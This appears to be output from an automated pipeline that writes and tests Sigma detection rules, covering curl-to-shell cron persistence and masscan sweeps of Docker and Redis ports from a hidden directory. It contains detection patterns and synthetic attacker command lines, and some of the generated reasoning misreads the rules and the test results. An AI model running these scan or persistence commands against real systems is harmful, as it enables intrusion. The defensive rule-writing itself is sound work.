+            "message": "Positive test R3 did not match: HTTP IP with step schedule 0-59/10, curl long flags --silent --location-trusted, pipe to zsh, heredoc-style quoting, parent is bash. Per selection: selection_cmd=match; selection_schedule=NO MATCH; selection_external_ip=match."
+          }
+        ],
+        "test_outcomes": [
+          {
+            "event_id": "P1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "N1",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N3",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R3",
+            "label": "positive",
+            "matched": false,
+            "passed": false
+          },
+          {
+            "event_id": "R4",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R5",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R6",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R7",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          }
+        ],
+        "positives_total": 7,
+        "positives_matched": 6,
+        "negatives_total": 6,
+        "negatives_matched": 0,
+        "benign_total": 180,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": false
+      },
+      "conversions": {
+        "splunk": "CommandLine IN (\"*curl*\", \"*|*\", \"*sh*\", \"*zsh*\")\n| regex CommandLine=\"^.*([*\\\\/,0-9]+\\\\s+){4}[*\\\\/,0-9]+.*$\"\n| regex CommandLine=\"http[s]?://(([0-9]{1,3}\\\\.){3}[0-9]{1,3})(:[0-9]+)?/\"",
+        "elasticsearch": "(CommandLine:(*curl* OR *\\|* OR *sh* OR *zsh*)) AND CommandLine:/^.*([*\\\\/,0-9]+\\s+){4}[*\\\\/,0-9]+.*$/ AND CommandLine:/http[s]?:\\/\\/(([0-9]{1,3}\\.){3}[0-9]{1,3})(:[0-9]+)?\\//",
+        "kusto": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"curl\" or ProcessCommandLine contains \"|\" or ProcessCommandLine contains \"sh\" or ProcessCommandLine contains \"zsh\") and ProcessCommandLine matches regex \"^.*([*\\\\/,0-9]+\\\\s+){4}[*\\\\/,0-9]+.*$\" and ProcessCommandLine matches regex \"http[s]?://(([0-9]{1,3}\\\\.){3}[0-9]{1,3})(:[0-9]+)?/\"",
+        "sqlite": "SELECT * FROM logs WHERE (CommandLine LIKE '%curl%' ESCAPE '\\' OR CommandLine LIKE '%|%' ESCAPE '\\' OR CommandLine LIKE '%sh%' ESCAPE '\\' OR CommandLine LIKE '%zsh%' ESCAPE '\\') AND CommandLine REGEXP '^.*([*\\/,0-9]+\\s+){4}[*\\/,0-9]+.*$' AND CommandLine REGEXP 'http[s]?://(([0-9]{1,3}\\.){3}[0-9]{1,3})(:[0-9]+)?/'"
+      },
+      "conversion_errors": {},
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "parse failed: detection has no 'condition'.",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 1,
+          "phase": "refine",
+          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/180",
+          "passed": true,
+          "change_summary": "Added required condition field to combine detections logically."
+        },
+        {
+          "iteration": 1,
+          "phase": "redteam",
+          "summary": "7 evasion variants -> positives 6/7, negatives blocked 6/6, benign hits 0/180",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 2,
+          "phase": "refine",
+          "summary": "positives 6/7, negatives blocked 6/6, benign hits 0/180",
+          "passed": false,
+          "change_summary": "Updated selection_cmd to include 'zsh' to catch pipes to zsh shells, ensuring the positive test with pipe to zsh matches while maintaining detection logic for curl pipe sh patterns."
+        }
+      ],
+      "author_notes": "",
+      "redteam_analysis": "Positive variants P4-P7 demonstrate realistic evasions that a well-written rule should catch: they preserve the attacker's goal (crontab entry downloading/executing remote script via curl pipe shell) while varying surface form (HTTPS vs HTTP, port, schedule formats: comma list, step, */n; curl flags: -kL, -fsS, --silent --location-trusted, -k; target shells: bash, sh, zsh, dash; quoting styles: single, double, heredoc, printf; parent processes: python3, sshd, bash, cron daemon). All contain 'curl', '|', 'sh' (substring in bash/zsh/dash), a 5-field cron schedule matching the regex, and an HTTP(S) URL with IPv4 address matching the IP regex. Negative variants N1-N3 are benign look-alikes that must not match: N1 lacks curl and pipe; N2 uses domain name not IP (IP regex fails); N3 uses @hourly schedule (schedule regex fails). Out-of-scope variants O1-O2 represent evasions the logsource fundamentally cannot detect with this rule: O1 splits the malicious content into a file write (not captured in installing process command line); O2 uses systemd timers, a different persistence technique entirely. The rule's reliance on a single process's CommandLine containing all indicators is both its strength and its blind spot.",
+      "redteam_out_of_scope": [
+        {
+          "id": "X1",
+          "label": "positive",
+          "description": "Attacker writes malicious cron entry to file first (content not in command line), then installs via crontab file - the installing process command line lacks curl, pipe, schedule, IP",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "crontab /tmp/malicious_cron",
+            "Computer": "docker-host-11",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash11",
+            "Hostname": "docker-host-11",
+            "Image": "/usr/bin/crontab",
+            "IntegrityLevel": "High",
+            "Keywords": "-",
+            "Level": "4",
+            "LogonId": "0",
+            "Message": "Process Create Rule",
+            "ParentCommandLine": "/bin/bash -c 'crontab /tmp/malicious_cron'",
+            "ParentImage": "/usr/bin/bash",
+            "ParentProcessId": "8899",
+            "ProcessId": "1011",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "-",
+            "TimeCreated": "2026-09-25T20:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-25T20:00:00.000Z"
+          }
+        },
+        {
+          "id": "X2",
+          "label": "positive",
+          "description": "Attacker uses systemd timer unit instead of cron - completely different technique, no crontab or curl pipe sh in command line",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "systemctl enable --now malicious.timer",
+            "Computer": "docker-host-12",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash12",
+            "Hostname": "docker-host-12",
+            "Image": "/usr/bin/systemctl",
+            "IntegrityLevel": "High",
+            "Keywords": "-",
+            "Level": "4",
+            "LogonId": "0",
+            "Message": "Process Create Rule",
+            "ParentCommandLine": "/bin/bash",
+            "ParentImage": "/usr/bin/bash",
+            "ParentProcessId": "9900",
+            "ProcessId": "1213",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "-",
+            "TimeCreated": "2026-09-25T21:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-25T21:00:00.000Z"
+          }
+        }
+      ]
+    },
+    {
+      "candidate_id": "D5",
+      "title": "Masscan Scanning Docker And Redis Ports From Hidden Directory",
+      "sigma_yaml": "title: Masscan Scanning Docker And Redis Ports From Hidden Directory\nid: 4f74bbf5-1b51-40b2-978a-90a97345f144\nstatus: experimental\ndescription: Detects execution of masscan from a hidden /tmp/.x/ directory targeting Docker API port 2375 and Redis port 6379,\n  indicative of opportunistic lateral movement in cryptomining campaigns.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-17'\ntags:\n- attack.lateral-movement\n- attack.t1021.004\nlogsource:\n  category: process_creation\n  product: linux\n  service: sysmon\ndetection:\n  selection_img:\n    'Image|endswith': /masscan\n  selection_dir:\n    'CommandLine|contains': /tmp/.x/\n  selection_port:\n    'CommandLine|contains': -p2375,6379\n  condition: selection_img and selection_dir and selection_port\nfalsepositives:\n- Legitimate network scanning using masscan from non-hidden directories\n- Authorized security assessments scanning internal services\n- Custom scripts invoking masscan for monitoring purposes\nlevel: medium\n",
+      "status": "needs_review",
+      "attack_technique_ids": [
+        "T1021.004"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "Masscan executed from hidden directory targeting Docker and Redis ports",
+          "event": {
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan 10.0.0.0/8 -p2375,6379 --rate 20000 -oL /tmp/.x/out.txt",
+            "ParentImage": "/bin/bash",
+            "User": "www-data"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "Masscan from alternate hidden path scanning same ports",
+          "event": {
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan 192.168.0.0/16 -p2375,6379 --rate 10000",
+            "ParentImage": "/usr/bin/python3",
+            "User": "root"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "Masscan with different output file but same hidden path and ports",
+          "event": {
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan 172.16.0.0/12 -p2375,6379 -oL /tmp/.x/scan_results.txt",
+            "ParentImage": "/usr/bin/cron",
+            "User": "root"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "Legitimate masscan usage from standard location",
+          "event": {
+            "Image": "/usr/bin/masscan",
+            "CommandLine": "/usr/bin/masscan 10.0.0.0/8 -p80,443 --rate 5000",
+            "ParentImage": "/bin/bash",
+            "User": "admin"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "Masscan from hidden directory but scanning common web ports only",
+          "event": {
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan 10.0.0.0/8 -p80,8080 --rate 10000",
+            "ParentImage": "/bin/bash",
+            "User": "www-data"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "Network scanner other than masscan from hidden directory",
+          "event": {
+            "Image": "/tmp/.x/nmap",
+            "CommandLine": "/tmp/.x/nmap 10.0.0.0/8 -p2375,6379",
+            "ParentImage": "/bin/bash",
+            "User": "www-data"
+          }
+        },
+        {
+          "id": "R1",
+          "label": "positive",
+          "description": "Masscan with spaced port flag and extra whitespace, same hidden directory",
+          "event": {
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan  10.0.0.0/8   -p 2375,6379  --rate 15000  -oL /tmp/.x/results.txt",
+            "ParentImage": "/bin/sh",
+            "User": "nginx"
+          }
+        },
+        {
+          "id": "R2",
+          "label": "positive",
+          "description": "Masscan using long-form port flag and quoted hidden path",
+          "event": {
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "\"/tmp/.x/masscan\" 192.168.10.0/24 --port 2375,6379 --rate 5000",
+            "ParentImage": "/usr/bin/perl",
+            "User": "www-data"
+          }
+        },
+        {
+          "id": "R3",
+          "label": "positive",
+          "description": "Masscan invoked via symlink in hidden directory with alternate rate flag",
+          "event": {
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan 172.16.0.0/12 -p2375,6379 -r 30000 -oL /tmp/.x/scan.log",
+            "ParentImage": "/usr/bin/php",
+            "User": "apache"
+          }
+        },
+        {
+          "id": "R4",
+          "label": "positive",
+          "description": "Masscan from environment-variable expanded hidden path",
+          "event": {
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "$TMPDIR/.x/masscan 10.10.0.0/16 -p2375,6379 --rate 25000",
+            "ParentImage": "/bin/bash",
+            "User": "redis"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "positive",
+          "description": "Masscan with single-port flags split and different CIDR notation",
+          "event": {
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan 192.168.0.0/255.255.0.0 -p2375 -p6379 --rate 10000",
+            "ParentImage": "/usr/bin/python3.11",
+            "User": "root"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "negative",
+          "description": "Legitimate security team running masscan from installed location for authorized Docker/Redis audit",
+          "event": {
+            "Image": "/opt/sec-tools/masscan",
+            "CommandLine": "/opt/sec-tools/masscan 10.0.0.0/8 -p2375,6379 --rate 5000 -oL /var/log/scan_audit.log",
+            "ParentImage": "/bin/bash",
+            "User": "secadmin"
+          }
+        },
+        {
+          "id": "R7",
+          "label": "negative",
+          "description": "Admin testing masscan from home directory with same ports but non-hidden path",
+          "event": {
+            "Image": "/home/admin/tools/masscan",
+            "CommandLine": "/home/admin/tools/masscan 192.168.1.0/24 -p2375,6379 --rate 1000",
+            "ParentImage": "/bin/zsh",
+            "User": "admin"
+          }
+        },
+        {
+          "id": "R8",
+          "label": "negative",
+          "description": "Monitoring wrapper script invoking masscan for internal service discovery",
+          "event": {
+            "Image": "/usr/local/bin/masscan",
+            "CommandLine": "/usr/local/bin/masscan 172.16.0.0/12 -p2375,6379 --rate 2000 -oL /var/log/monitor.log",
+            "ParentImage": "/usr/bin/python3",
+            "User": "monitoring"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D5",
+        "parse_ok": true,
+        "sql": "SELECT * FROM logs WHERE Image LIKE '%/masscan' ESCAPE '\\' AND CommandLine LIKE '%/tmp/.x/%' ESCAPE '\\' AND CommandLine LIKE '%-p2375,6379%' ESCAPE '\\'",
+        "issues": [
+          {
+            "severity": "error",
+            "code": "positive_missed",
+            "message": "Positive test R1 did not match: Masscan with spaced port flag and extra whitespace, same hidden directory. Per selection: selection_img=match; selection_dir=match; selection_port=NO MATCH."
+          },
+          {
+            "severity": "error",
+            "code": "positive_missed",
+            "message": "Positive test R2 did not match: Masscan using long-form port flag and quoted hidden path. Per selection: selection_img=match; selection_dir=match; selection_port=NO MATCH."
+          },
+          {
+            "severity": "error",
+            "code": "positive_missed",
+            "message": "Positive test R4 did not match: Masscan from environment-variable expanded hidden path. Per selection: selection_img=match; selection_dir=NO MATCH; selection_port=match."
+          },
+          {
+            "severity": "error",
+            "code": "positive_missed",
+            "message": "Positive test R5 did not match: Masscan with single-port flags split and different CIDR notation. Per selection: selection_img=match; selection_dir=match; selection_port=NO MATCH."
+          }
+        ],
+        "test_outcomes": [
+          {
+            "event_id": "P1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "N1",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N3",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R1",
+            "label": "positive",
+            "matched": false,
+            "passed": false
+          },
+          {
+            "event_id": "R2",
+            "label": "positive",
+            "matched": false,
+            "passed": false
+          },
+          {
+            "event_id": "R3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R4",
+            "label": "positive",
+            "matched": false,
+            "passed": false
+          },
+          {
+            "event_id": "R5",
+            "label": "positive",
+            "matched": false,
+            "passed": false
+          },
+          {
+            "event_id": "R6",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R7",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R8",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          }
+        ],
+        "positives_total": 8,
+        "positives_matched": 4,
+        "negatives_total": 6,
+        "negatives_matched": 0,
+        "benign_total": 180,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": false
+      },
+      "conversions": {
+        "splunk": "Image=\"*/masscan\" CommandLine=\"*/tmp/.x/*\" CommandLine=\"*-p2375,6379*\"",
+        "elasticsearch": "Image:*\\/masscan AND CommandLine:*\\/tmp\\/.x\\/* AND CommandLine:*\\-p2375,6379*",
+        "kusto": "DeviceProcessEvents\n| where FolderPath endswith \"/masscan\" and ProcessCommandLine contains \"/tmp/.x/\" and ProcessCommandLine contains \"-p2375,6379\"",
+        "sqlite": "SELECT * FROM logs WHERE Image LIKE '%/masscan' ESCAPE '\\' AND CommandLine LIKE '%/tmp/.x/%' ESCAPE '\\' AND CommandLine LIKE '%-p2375,6379%' ESCAPE '\\'"
+      },
+      "conversion_errors": {},
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "positives 3/3, negatives blocked 2/3, benign hits 0/180",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 1,
+          "phase": "refine",
+          "summary": "positives 3/3, negatives blocked 2/3, benign hits 0/180",
+          "passed": false,
+          "change_summary": "Fixed the rule by ensuring the command line requires BOTH the hidden directory (/tmp/.x/) AND the specific port combination (-p2375,6379) to prevent false positives from masscan scanning other ports even when run from a hidden directory."
+        },
+        {
+          "iteration": 2,
+          "phase": "refine",
+          "summary": "positives 3/3, negatives blocked 2/3, benign hits 0/180",
+          "passed": false,
+          "change_summary": "No changes were required to address the validation issues because the rule already correctly rejects the provided negative test event N2 (which scans ports 80,8080, not 2375,6379). However, upon re-examination, the validation report incorrectly claimed N2 matched; our analysis shows selection_cmd fails due to missing '-p2375,6379'. Thus the rule remains valid and requires no modification."
+        },
+        {
+          "iteration": 3,
+          "phase": "refine",
+          "summary": "positives 3/3, negatives blocked 2/3, benign hits 0/180",
+          "passed": false,
+          "change_summary": "Removed redundant regex anchors around '-p2375,6379' to ensure exact port-pair matching while still requiring the hidden directory path."
+        },
+        {
+          "iteration": 3,
+          "phase": "redteam",
+          "summary": "8 evasion variants -> positives 8/8, negatives blocked 2/6, benign hits 0/180",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 4,
+          "phase": "refine",
+          "summary": "positives 4/8, negatives blocked 6/6, benign hits 0/180",
+          "passed": false,
+          "change_summary": "Added separate selection for hidden directory path to ensure it is required in command line, preventing matches on legitimate scans from other locations while maintaining detection of malicious usage from /tmp/.x/."
+        }
+      ],
+      "author_notes": "Rule focuses on the combination of hidden execution path and specific port targets to minimize false positives from legitimate scanning tools. Assumes sysmon-for-linux provides process creation logs with Image and CommandLine fields.",
+      "redteam_analysis": "Positive variants cover realistic operator evasions: spaced port flags (-p 2375,6379), long-form flags (--port), quoted paths, symlinks, environment variable expansion ($TMPDIR), and split single-port flags (-p2375 -p6379). All preserve the three rule anchors: Image endswith masscan, CommandLine contains /tmp/.x/, and CommandLine contains 2375,6379 port pair. A well-written rule using endswith on Image and contains on CommandLine will catch these. Negative variants show legitimate administrative usage from non-hidden paths (/opt/sec-tools, /home/admin/tools, /usr/local/bin) with same ports but different Image paths, which the rule correctly excludes because Image does not end with /tmp/.x/masscan. Out-of-scope evasions highlight fundamental logsource limits: renamed binary (Image no longer endswith masscan), interpreter-mediated execution (parent is python3, command line shows python -c not masscan), and containerized execution where the hidden path may be virtualized. These require complementary telemetry (file_creation for binary rename, script_content for python -c, container runtime monitoring) and are correctly reported for analyst awareness rather than rule modification.",
+      "redteam_out_of_scope": [
+        {
+          "id": "X1",
+          "label": "positive",
+          "description": "Renamed masscan binary (scanner) executed from hidden directory - rule keys on Image ending with masscan",
+          "event": {
+            "Image": "/tmp/.x/scanner",
+            "CommandLine": "/tmp/.x/scanner 10.0.0.0/8 -p2375,6379 --rate 20000",
+            "ParentImage": "/bin/bash",
+            "User": "www-data"
+          }
+        },
+        {
+          "id": "X2",
+          "label": "positive",
+          "description": "Masscan executed via python subprocess without direct process creation visibility",
+          "event": {
+            "Image": "/usr/bin/python3",
+            "CommandLine": "python3 -c \"import subprocess; subprocess.run(['/tmp/.x/masscan', '10.0.0.0/8', '-p2375,6379', '--rate', '20000'])\"",
+            "ParentImage": "/bin/bash",
+            "User": "www-data"
+          }
+        },
+        {
+          "id": "X3",
+          "label": "positive",
+          "description": "Masscan running inside container namespace - host process_creation may not see hidden path",
+          "event": {
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan 10.0.0.0/8 -p2375,6379 --rate 20000",
+            "ParentImage": "/usr/bin/containerd-shim",
+            "User": "root"
+          }
+        }
+      ]
+    }
+  ],
+  "metrics": {
+    "calls": [
+      {
+        "stage": "extract",
+        "tier": "fast",
+        "model": "nvidia/Nemotron-3_5-Lightning",
+        "prompt_tokens": 3843,
+        "completion_tokens": 3110,
+        "latency_s": 10.351,
+        "cost_usd": 0.000977,
+        "thinking": false
+      },
+      {
+        "stage": "plan",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 5616,
+        "completion_tokens": 5268,
+        "latency_s": 15.207,
+        "cost_usd": 0.02142,
+        "thinking": true
+      },
+      {
+        "stage": "author",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3677,
+        "completion_tokens": 834,
+        "latency_s": 4.981,
+        "cost_usd": 0.001854,
+        "thinking": false
+      },
+      {
+        "stage": "author",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3485,
+        "completion_tokens": 1582,
+        "latency_s": 7.478,
+        "cost_usd": 0.002469,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4286,
+        "completion_tokens": 382,
+        "latency_s": 2.015,
+        "cost_usd": 0.00163,
+        "thinking": false
+      },
+      {
+        "stage": "author",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3482,
+        "completion_tokens": 2415,
+        "latency_s": 11.002,
+        "cost_usd": 0.003218,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3959,
+        "completion_tokens": 373,
+        "latency_s": 2.437,
+        "cost_usd": 0.001523,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3405,
+        "completion_tokens": 316,
+        "latency_s": 2.072,
+        "cost_usd": 0.001306,
+        "thinking": false
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 2041,
+        "completion_tokens": 5788,
+        "latency_s": 19.997,
+        "cost_usd": 0.019405,
+        "thinking": true
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 2432,
+        "completion_tokens": 4294,
+        "latency_s": 13.124,
+        "cost_usd": 0.015314,
+        "thinking": true
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4659,
+        "completion_tokens": 470,
+        "latency_s": 2.747,
+        "cost_usd": 0.001821,
+        "thinking": false
+      },
+      {
+        "stage": "author",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3398,
+        "completion_tokens": 884,
+        "latency_s": 4.375,
+        "cost_usd": 0.001815,
+        "thinking": false
+      },
+      {
+        "stage": "author",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3405,
+        "completion_tokens": 1957,
+        "latency_s": 8.23,
+        "cost_usd": 0.002783,
+        "thinking": false
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 2900,
+        "completion_tokens": 6892,
+        "latency_s": 20.874,
+        "cost_usd": 0.023576,
+        "thinking": true
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3425,
+        "completion_tokens": 294,
+        "latency_s": 1.845,
+        "cost_usd": 0.001292,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3790,
+        "completion_tokens": 356,
+        "latency_s": 2.149,
+        "cost_usd": 0.001457,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3421,
+        "completion_tokens": 334,
+        "latency_s": 1.996,
+        "cost_usd": 0.001327,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3421,
+        "completion_tokens": 272,
+        "latency_s": 2.15,
+        "cost_usd": 0.001271,
+        "thinking": false
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 2001,
+        "completion_tokens": 2172,
+        "latency_s": 9.92,
+        "cost_usd": 0.008517,
+        "thinking": true
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3977,
+        "completion_tokens": 289,
+        "latency_s": 1.767,
+        "cost_usd": 0.001453,
+        "thinking": false
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 2624,
+        "completion_tokens": 6471,
+        "latency_s": 20.816,
+        "cost_usd": 0.022037,
+        "thinking": true
+      }
+    ]
+  },
+  "models": {
+    "fast": "nvidia/Nemotron-3_5-Lightning",
+    "main": "nvidia/nemotron-3-super-120b-a12b",
+    "reasoning": "nvidia/Nemotron-3-Ultra-550b-a55b"
+  },
+  "warnings": []
+}
